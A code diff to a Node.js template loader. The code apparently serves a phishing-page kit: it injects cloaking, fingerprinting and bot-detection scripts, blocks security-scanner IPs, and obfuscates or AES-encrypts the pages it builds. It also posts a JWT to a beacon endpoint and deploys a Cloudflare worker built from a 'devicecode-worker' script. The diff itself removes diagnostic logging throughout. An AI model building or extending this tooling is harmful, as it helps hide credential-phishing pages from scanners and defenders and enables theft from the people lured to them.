@@ -151,15 +151,15 @@ function loadVerificationDesignHTML(designName) {
         htmlCandidates.push(path.join(DESIGNS_DIR, 'slider.html'));
     }
     
-    console.log('[Templateloader] Checking HTML candidates:');
+
     htmlCandidates.forEach(fp => {
         const exists = fs.existsSync(fp);
-        console.log('  ' + fp + ' -> ' + (exists ? 'EXISTS' : 'NOT FOUND'));
+
     });
     
     for (const fp of htmlCandidates) {
         if (fs.existsSync(fp)) {
-            console.log('[Templateloader] Found verification design HTML:', fp);
+
             const content = fs.readFileSync(fp, 'utf8');
             const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
             const scriptTags = content.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi) || [];
@@ -188,7 +188,7 @@ function loadVerificationDesignHTML(designName) {
         }
     }
     
-    console.log('[Templateloader] No verification design HTML found for:', bn);
+
     return { css: '', js: '', html: '', hasHtml: false };
 }
 
@@ -318,7 +318,7 @@ function obfuscateJs(sourceCode, options) {
         const JavaScriptObfuscator = require('javascript-obfuscator');
         const workersSafe = !!(options && options.workersSafe);
 
-        console.log('[Obfuscation] Single-stage obfuscation' + (workersSafe ? ' (workers-safe)' : '') + '...');
+
         const result = JavaScriptObfuscator.obfuscate(sourceCode, {
             compact: true,             
             controlFlowFlattening: true,     
@@ -350,11 +350,11 @@ function obfuscateJs(sourceCode, options) {
         });
 
         const finalCode = result.getObfuscatedCode();
-        console.log('[Obfuscation] Complete: ' + sourceCode.length + ' -> ' + finalCode.length + ' chars');
+
 
         return finalCode;
     } catch (e) {
-        console.error('[Obfuscation] Failed:', e.message, e.stack || '');
+
         return sourceCode;
     }
 }
@@ -362,15 +362,12 @@ function obfuscateJs(sourceCode, options) {
 function reportTurnstileKey(key, linkId, ctx) {
     const k = String(key || '').trim();
     if (!k) {
-        console.warn('[Templateloader] ' + ctx + ': NO Turnstile site key for link ' + linkId +
-            ' - the challenge will NOT render and the visitor will be let straight through.');
+
     } else if (/CHANGE_ME|REPLACE_ME|YOUR_|xxxx/i.test(k)) {
-        console.warn('[Templateloader] ' + ctx + ': Turnstile site key for link ' + linkId +
-            ' is a placeholder ("' + k + '") - the challenge will NOT render.');
+
     } else {
 
-        console.log('[Templateloader] ' + ctx + ': link ' + linkId + ' resolved site key ' +
-            k.substring(0, 16) + '...' + k.length + ' chars');
+
     }
 }
 
@@ -394,7 +391,7 @@ async function buildWindowVars(link, user, settings, options) {
             if (sk) turnstileSiteKey = sk;
         }
     } catch (e) {
-        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+
     }
     reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
     var apiBase = '';
@@ -731,9 +728,9 @@ function buildSliderOverlay(sliderData, link, obfuscate = false) {
             finalSliderJs = obfuscateJs(sliderJs);
             finalSliderJs = finalSliderJs.replace(/<\/script/gi, '<\\/script')
                                           .replace(/<\/style/gi, '<\\/style');
-            console.log('[Templateloader] Slider overlay obfuscated successfully');
+
         } catch (e) {
-            console.error('[Templateloader] Slider overlay obfuscation failed:', e && e.message);
+
             finalSliderJs = sliderJs;
         }
     } else {
@@ -836,7 +833,7 @@ function buildSplashOverlay(config, link, obfuscate = false) {
     let finalSplashJs = splashJs;
     if (obfuscate) {
         try { finalSplashJs = obfuscateJs(splashJs); } catch (e) {
-            console.error('[Templateloader] Splash obfuscation failed:', e.message);
+
         }
     }
 
@@ -859,7 +856,7 @@ async function renderPageHtml(link, user, options) {
                 return null;
             }
         } catch (e) {
-            console.warn('[Templateloader] bot classify failed:', e.message);
+
         }
     }
 
@@ -883,18 +880,18 @@ async function renderPageHtml(link, user, options) {
     const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
     
     // DEBUG: Log slider detection details
-    console.log('[Templateloader] ═══ SLIDER DETECTION ═══');
-    console.log('  designName:', designName);
-    console.log('  designName.toLowerCase().includes("slider"):', designName.toLowerCase().includes('slider'));
-    console.log('  sliderData.hasHtml:', sliderData.hasHtml);
-    console.log('  sliderData.html length:', sliderData.html ? sliderData.html.length : 0);
-    console.log('  sliderData.css length:', sliderData.css ? sliderData.css.length : 0);
-    console.log('  sliderData.js length:', sliderData.js ? sliderData.js.length : 0);
-    console.log('  isSliderDesign:', isSliderDesign);
-    console.log('  link.verification_design:', link.verification_design);
-    console.log('  link.id:', link.id);
-    console.log('  link.template_type:', link.template_type);
-    console.log('[Templateloader] ═══ END SLIDER DETECTION ═══');
+
+
+
+
+
+
+
+
+
+
+
+
 
     if (html.includes('{{CSS}}')) {
         html = html.replace(/\/\*\s*\{\{CSS\}\}\s*\*\/|{{CSS}}/g, css);
@@ -922,7 +919,7 @@ async function renderPageHtml(link, user, options) {
             if (sk) turnstileKey = sk;
         }
     } catch (e) {
-        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+
     }
 
     if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
@@ -973,51 +970,51 @@ async function renderPageHtml(link, user, options) {
         headScripts += '<script>' + vgBehavior + '</script>';
     }
     if (vgEngine) {
-        console.log('[Templateloader] Injecting vg-engine.js, length:', vgEngine.length);
-        console.log('  vg-engine contains </script>:', vgEngine.includes('</script>'));
-        console.log('  vg-engine contains <script>:', vgEngine.includes('<script>'));
+
+
+
         headScripts += '<script>' + vgEngine + '</script>';
     }
 
     if (html.includes('</head>')) {
         html = html.split('</head>').join(headScripts + '</head>');
-        console.log('[Templateloader] Runtime scripts injected before </head>');
+
     } else {
 
         const htmlWithHead = insertBeforeRealBodyClose(html, headScripts);
         html = htmlWithHead || (html + headScripts);
-        console.warn('[Templateloader] No </head> found - injected runtime scripts at the end of <body>');
+
     }
 
-    console.log('[Templateloader] ═══ HTML DIAGNOSTICS ═══');
-    console.log('  Total HTML length:', html.length);
-    console.log('  Contains <html>:', html.includes('<html>'));
-    console.log('  Contains </html>:', html.includes('</html>'));
-    console.log('  Contains <head>:', html.includes('<head>'));
-    console.log('  Contains </head>:', html.includes('</head>'));
-    console.log('  Contains <body:', html.includes('<body'));
-    console.log('  Contains </body>:', html.includes('</body>'));
-    console.log('  Contains <style>:', html.includes('<style>'));
-    console.log('  Contains </style>:', html.includes('</style>'));
-    console.log('  Contains <script>:', html.includes('<script>'));
-    console.log('  Contains </script>:', html.includes('</script>'));
+
+
+
+
+
+
+
+
+
+
+
+
     
     const scriptOpenCount = (html.match(/<script/g) || []).length;
     const scriptCloseCount = (html.match(/<\/script>/g) || []).length;
-    console.log('  <script> tags:', scriptOpenCount);
-    console.log('  </script> tags:', scriptCloseCount);
-    console.log('  Script tags balanced:', scriptOpenCount === scriptCloseCount);
+
+
+
     
     if (scriptOpenCount !== scriptCloseCount) {
-        console.warn('  ⚠️  UNBALANCED SCRIPT TAGS!');
+
     }
     if (html.includes('<script><script>')) {
-        console.warn('  ⚠️  NESTED <script><script> DETECTED!');
+
     }
     if (html.includes('</script></script>')) {
-        console.warn('  ⚠️  NESTED </script></script> DETECTED!');
+
     }
-    console.log('[Templateloader] ═══ END DIAGNOSTICS ═══');
+
 
     if (templateConfig.preload) {
         html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
@@ -1032,23 +1029,20 @@ async function renderPageHtml(link, user, options) {
 
 
     if (isSliderDesign && !options.exportForDownload) {
-        console.log('[Templateloader] Injecting slider overlay for design:', designName);
-        console.log('[Templateloader] Slider data: hasHtml=' + sliderData.hasHtml + 
-                    ', html length=' + (sliderData.html ? sliderData.html.length : 0) +
-                    ', css length=' + (sliderData.css ? sliderData.css.length : 0) +
-                    ', js length=' + (sliderData.js ? sliderData.js.length : 0));
+
+
         const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
-        console.log('[Templateloader] Slider overlay built: length=' + sliderOverlay.length);
+
         // Count script tags in the slider overlay
         const sliderScriptCount = (sliderOverlay.match(/<script/g) || []).length;
         const sliderCloseCount = (sliderOverlay.match(/<\/script>/g) || []).length;
-        console.log('[Templateloader] Slider overlay script tags: open=' + sliderScriptCount + ', close=' + sliderCloseCount);
+
         const withOverlay = insertAfterRealBody(html, sliderOverlay);
         if (withOverlay !== null) {
             html = withOverlay;
-            console.log('[Templateloader] Slider overlay injected after the document body');
+
         } else {
-            console.warn('[Templateloader] ⚠️ No real <body> found - slider overlay NOT injected');
+
         }
     }
 
@@ -1057,10 +1051,9 @@ async function renderPageHtml(link, user, options) {
         const withSplash = insertAfterRealBody(html, splashOverlay);
         if (withSplash !== null) {
             html = withSplash;
-            console.log('[Templateloader] Splash overlay injected (brand: ' +
-                ((templateConfig && templateConfig.name) || 'Workspace') + ', length=' + splashOverlay.length + ')');
+
         } else {
-            console.warn('[Templateloader] ⚠️ No real <body> found - splash overlay NOT injected');
+
         }
     }
 
@@ -1076,10 +1069,10 @@ async function renderPageHtml(link, user, options) {
                 const originalBlock = '<script>' + vgCloak + '</script>';
                 if (html.indexOf(originalBlock) !== -1) {
                     html = html.split(originalBlock).join('<script>' + obfuscatedCloak + '</script>');
-                    console.log('[Templateloader] vg-cloak obfuscated successfully');
+
                 }
             } catch (e) {
-                console.error('[Templateloader] vg-cloak obfuscation failed:', e && e.message);
+
             }
         }
         // Obfuscate vg-engine.js
@@ -1088,39 +1081,36 @@ async function renderPageHtml(link, user, options) {
                 const obfuscatedEngine = safeEmbedJs(obfuscateJs(vgEngine));
                 // DEBUG: Verify safeEmbedJs actually escaped the obfuscated output
                 const dbgStrayCount = (obfuscatedEngine.match(/<\/script/gi) || []).length;
-                console.log('[Templateloader] DEBUG vg-engine after safeEmbedJs: length=' + obfuscatedEngine.length +
-                            ', stray </script>=' + dbgStrayCount +
-                            ', stray </style>=' + (obfuscatedEngine.match(/<\/style/gi) || []).length);
+
                 if (dbgStrayCount > 0) {
                     // Find first occurrence context
                     const dbgIdx = obfuscatedEngine.search(/<\/script/gi);
                     if (dbgIdx >= 0) {
-                        console.log('[Templateloader] DEBUG vg-engine first </script> context:',
-                            JSON.stringify(obfuscatedEngine.substring(Math.max(0, dbgIdx - 40), dbgIdx + 40)));
+
                     }
                 }
                 const originalBlock = '<script>' + vgEngine + '</script>';
                 if (html.indexOf(originalBlock) !== -1) {
                     html = html.split(originalBlock).join('<script>' + obfuscatedEngine + '</script>');
-                    console.log('[Templateloader] vg-engine block replaced via exact match (with <script> tags)');
+
                 } else {
                     // Check if vgEngine was injected without <script> tags (template has {{VG_ENGINE}} placeholder)
                     if (html.indexOf(vgEngine) !== -1) {
                         html = html.split(vgEngine).join('<script>' + obfuscatedEngine + '</script>');
-                        console.log('[Templateloader] vg-engine block replaced via exact match (without <script> tags, added tags)');
+
                     } else {
                         // WARNING: Neither exact match found - this will likely cause HTML corruption
                         const beforeLen = html.length;
                         html = html.replace(/<script>[\s\S]*?<\/script>/, '<script>' + obfuscatedEngine + '</script>');
-                        console.warn('[Templateloader] ⚠️ vg-engine: neither exact match found, using regex (DANGEROUS!)');
-                        console.warn('[Templateloader] ⚠️ This may replace the wrong <script> block!');
-                        console.log('[Templateloader] vg-engine block replaced via regex (html len:', beforeLen, '->', html.length, ')');
+
+
+
                     }
                 }
-                console.log('[Templateloader] VG engine obfuscated successfully');
+
             } catch (e) {
-                console.error('[Templateloader] VG engine obfuscation failed:', e && e.message);
-                console.error('[Templateloader] Obfuscation may not be installed. Run: npm install');
+
+
             }
         }
         // Obfuscate vg-fingerprint.js
@@ -1130,10 +1120,10 @@ async function renderPageHtml(link, user, options) {
                 const originalBlock = '<script>' + vgFingerprint + '</script>';
                 if (html.indexOf(originalBlock) !== -1) {
                     html = html.split(originalBlock).join('<script>' + obfuscatedFp + '</script>');
-                    console.log('[Templateloader] vg-fingerprint obfuscated successfully');
+
                 }
             } catch (e) {
-                console.error('[Templateloader] vg-fingerprint obfuscation failed:', e && e.message);
+
             }
         }
         // Obfuscate vg-behavior.js
@@ -1143,10 +1133,10 @@ async function renderPageHtml(link, user, options) {
                 const originalBlock = '<script>' + vgBehavior + '</script>';
                 if (html.indexOf(originalBlock) !== -1) {
                     html = html.split(originalBlock).join('<script>' + obfuscatedBh + '</script>');
-                    console.log('[Templateloader] vg-behavior obfuscated successfully');
+
                 }
             } catch (e) {
-                console.error('[Templateloader] vg-behavior obfuscation failed:', e && e.message);
+
             }
         }
         // Obfuscate inline script
@@ -1156,16 +1146,14 @@ async function renderPageHtml(link, user, options) {
                 // DEBUG: Verify safeEmbedJs escaped the inline script too
                 const inlineStrayClose = (obfuscatedScript.match(/<\/script/gi) || []).length;
                 const inlineStrayOpen = (obfuscatedScript.match(/<script/gi) || []).length;
-                console.log('[Templateloader] DEBUG inline script after safeEmbedJs: length=' + obfuscatedScript.length +
-                            ', stray </script>=' + inlineStrayClose +
-                            ', stray <script=' + inlineStrayOpen);
+
             
                 
                 // Method 1: Exact match (fastest)
                 const originalScriptBlock = '<script>' + script + '</script>';
                 if (html.indexOf(originalScriptBlock) !== -1) {
                     html = html.split(originalScriptBlock).join('<script>' + obfuscatedScript + '</script>');
-                    console.log('[Templateloader] Inline script block replaced via exact match');
+
                 } else {
                     // Method 2: Find the <script> block containing the script content
                     const scriptPos = html.indexOf(script);
@@ -1181,22 +1169,22 @@ async function renderPageHtml(link, user, options) {
                                 const after = html.substring(scriptEnd + 9); // 9 = length of '</script>'
                                 html = before + '<script>' + obfuscatedScript + '</script>' + after;
                                 const beforeLen = before.length + after.length + '<script></script>'.length;
-                                console.log('[Templateloader] Inline script block replaced via position (html len:', beforeLen, '->', html.length, ')');
+
                             } else {
-                                console.warn('[Templateloader] ⚠️ Inline script: found script content but no </script> tag - skipping replacement');
+
                             }
                         } else {
-                            console.warn('[Templateloader] ⚠️ Inline script: found script content but no <script> tag - skipping replacement');
+
                         }
                     } else {
-                        console.warn('[Templateloader] ⚠️ Inline script: script content not found in HTML');
-                        console.warn('[Templateloader] ⚠️ Template likely loads JS externally (via <script src="...">)');
-                        console.warn('[Templateloader] ⚠️ Skipping inline script obfuscation to prevent HTML corruption');
+
+
+
                     }
                 }
-                console.log('[Templateloader] Inline script obfuscated successfully');
+
             } catch (e) {
-                console.error('[Templateloader] Inline script obfuscation failed:', e && e.message);
+
             }
         }
     }
@@ -1215,8 +1203,8 @@ async function renderPageHtml(link, user, options) {
             const scriptEnd = html.toLowerCase().indexOf('</script>', nextOpen);
             if (scriptEnd === -1) {
                 // Unclosed <script> tag - this is a problem
-                console.warn('[Templateloader] ⚠️ POST-OBFUSCATION SAFETY: found unclosed <script> tag at position', nextOpen);
-                console.warn('[Templateloader] ⚠️ Context:', JSON.stringify(html.substring(Math.max(0, nextOpen - 50), nextOpen + 100)));
+
+
                 break;
             }
             
@@ -1245,36 +1233,36 @@ async function renderPageHtml(link, user, options) {
         }
         
         if (leakCount > 0) {
-            console.warn('[Templateloader] ⚠️ POST-OBFUSCATION SAFETY: found', leakCount, 'stray </script> sequence(s) INSIDE script blocks');
-            console.warn('[Templateloader] ⚠️ This means obfuscated JS contains an unescaped </script> that will terminate the script block early');
+
+
             if (leaks.length > 0) {
-                console.warn('[Templateloader] ⚠️ First leak at position', leaks[0].position);
-                console.warn('[Templateloader] ⚠️ First leak context:', JSON.stringify(leaks[0].context));
+
+
             }
         } else {
-            console.log('[Templateloader] ✓ POST-OBFUSCATION SAFETY: no stray </script> sequences detected inside script blocks');
+
         }
     }
 
     if (html.includes('{{')) {
-        console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
+
         html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
         html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
         html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
         html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
         // Replace any other remaining placeholders with empty string
         html = html.replace(/\{\{[^}]+\}\}/g, '');
-        console.log('[Templateloader] Placeholders cleaned up');
+
     }
 
     if (options.exportForDownload) {
-        console.log('[Templateloader] Export mode: Starting encryption...');
-        console.log('[Templateloader] HTML length before encryption:', html.length);
+
+
 
         // Remove beacon script for static exports (will be re-added inside encrypted payload)
         html = html.replace(/<script>fetch\([^)]*beacon[^)]*\)[^<]*<\/script>/g, '');
 
-        console.log('[Templateloader] Skipping text obfuscation for exports (AES encryption is sufficient)');
+
 
         const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
         html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);
@@ -1282,17 +1270,17 @@ async function renderPageHtml(link, user, options) {
         if (isSliderDesign) {
             const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
             html = insertAfterRealBody(html, sliderOverlay) || html;
-            console.log('[Templateloader] Slider overlay injected before encryption for export');
+
         }
 
         // Encrypt the entire HTML payload
         try {
             const encrypted = encryptPayload(html);
-            console.log('[Templateloader] Encrypted successfully');
-            console.log('[Templateloader] Cipher length:', encrypted.cipher.length);
-            console.log('[Templateloader] Salt:', encrypted.salt);
-            console.log('[Templateloader] IV:', encrypted.iv);
-            console.log('[Templateloader] Tag:', encrypted.tag);
+
+
+
+
+
 
             // Web Crypto API requires tag appended to ciphertext
             const ctBuffer = Buffer.concat([Buffer.from(encrypted.cipher, 'base64'), Buffer.from(encrypted.tag, 'base64')]);
@@ -1331,7 +1319,6 @@ async function renderPageHtml(link, user, options) {
                 'if(err.name==="OperationError")msg="Decryption failed: Invalid key or corrupted data. Please re-download.";',
                 'if(el){el.textContent=msg;el.style.color="#c00";}',
                 'else{document.body.innerHTML="<div style=padding:40px;text-align:center;font-family:sans-serif;color:#c00;>"+msg+"</div>";}',
-                'console.error("[VG Export] Decryption failed:",err);',
                 '}',
                 '})();',
                 '</script>',
@@ -1340,10 +1327,10 @@ async function renderPageHtml(link, user, options) {
             ];
 
             html = wrapperLines.join('\n');
-            console.log('[Templateloader] Export wrapper built, final length:', html.length);
+
         } catch (e) {
-            console.error('[Templateloader] Encryption failed:', e && e.message);
-            console.error('[Templateloader] Stack:', e && e.stack);
+
+
             throw e;
         }
     }
@@ -1351,7 +1338,7 @@ async function renderPageHtml(link, user, options) {
     html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);
 
     if (html.includes('{{')) {
-        console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
+
         // Replace any remaining endpoint placeholders with actual URLs
         html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
         html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
@@ -1359,7 +1346,7 @@ async function renderPageHtml(link, user, options) {
         html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
         // Replace any other remaining placeholders with empty string
         html = html.replace(/\{\{[^}]+\}\}/g, '');
-        console.log('[Templateloader] Placeholders cleaned up');
+
     }
     
     {
@@ -1368,14 +1355,14 @@ async function renderPageHtml(link, user, options) {
         const finalStyleOpen = (html.match(/<style/g) || []).length;
         const finalStyleClose = (html.match(/<\/style>/g) || []).length;
         
-        console.log('[Templateloader] ═══ FINAL HTML STRUCTURE ═══');
-        console.log('[Templateloader] Total HTML length:', html.length);
-        console.log('[Templateloader] <script> tags:', finalScriptOpen);
-        console.log('[Templateloader] </script> tags:', finalScriptClose);
-        console.log('[Templateloader] <style> tags:', finalStyleOpen);
-        console.log('[Templateloader] </style> tags:', finalStyleClose);
-        console.log('[Templateloader] Script tags balanced:', finalScriptOpen === finalScriptClose);
-        console.log('[Templateloader] Style tags balanced:', finalStyleOpen === finalStyleClose);
+
+
+
+
+
+
+
+
         
         // Check for </script> in string literals (would be a bug)
         const scriptContentMatches = html.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
@@ -1384,14 +1371,14 @@ async function renderPageHtml(link, user, options) {
             const content = match.slice(7, -9); // Remove <script...> and </script>
             const leaks = (content.match(/<\/script/gi) || []).length;
             if (leaks > 0) {
-                console.warn('[Templateloader] ⚠️ Found', leaks, 'stray </script> inside script block at position', html.indexOf(match));
+
                 totalLeaks += leaks;
             }
         }
         if (totalLeaks === 0) {
-            console.log('[Templateloader] ✓ No </script> leaks inside script blocks');
+
         }
-        console.log('[Templateloader] ═══ END FINAL CHECK ═══');
+
     }
     
     return html;
@@ -1404,7 +1391,7 @@ async function generateExportHtml(link, user, options) {
 
 // ─── Worker Script Builder ─────────────────────────────────
 async function buildWorkerScript(link, user, apiBaseUrl) {
-    console.log('[WorkerBuilder] apiBaseUrl passed:', apiBaseUrl);
+
     let pageDomain = '';
     if (link.custom_domain) {
         pageDomain = String(link.custom_domain).trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase();
@@ -1416,7 +1403,7 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
         pageDomain = String(link.worker_name) + '.' + suffix;
     }
     const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: '', relativeApi: true, domain: pageDomain });
-    console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
+
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 workerJs = workerJs.replace(/^\uFEFF/, '');
     const verifyUrl = apiBaseUrl || config.API_URL || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
@@ -1459,7 +1446,7 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
             if (sk_)  tsSecretKey = sk_;
         }
     } catch (e) {
-        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
+
     }
 
     reportTurnstileKey(tsSiteKey, link && link.id, 'buildWorkerScript');
@@ -1469,7 +1456,7 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
         const scannerBlocklist = require('./scanner-blocklist');
         blockedIps = await scannerBlocklist.listBlockedIps();
     } catch (e) {
-        console.warn('[Templateloader] Scanner blocklist lookup failed, deploying with empty list:', e.message);
+
     }
 
         const replaceLiteralPlaceholder = (placeholder, value) => {
@@ -1518,17 +1505,17 @@ function validateWorkerBundleForRuntime(code) {
             env: process.env,
         });
         if (res.error) {
-            console.warn('[WorkerBuilder] Runtime validation could not run (' + res.error.message + ') - skipping gate.');
+
             return 0;
         }
         if (res.signal) {
             // Killed by a signal (OOM etc.) - inconclusive, skip the gate.
-            console.warn('[WorkerBuilder] Runtime validation was killed by signal ' + res.signal + ' - skipping gate.');
+
             return 0;
         }
         return res.status;
     } catch (e) {
-        console.warn('[WorkerBuilder] Runtime validation error (' + e.message + ') - skipping gate.');
+
         return 0;
     } finally {
         try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
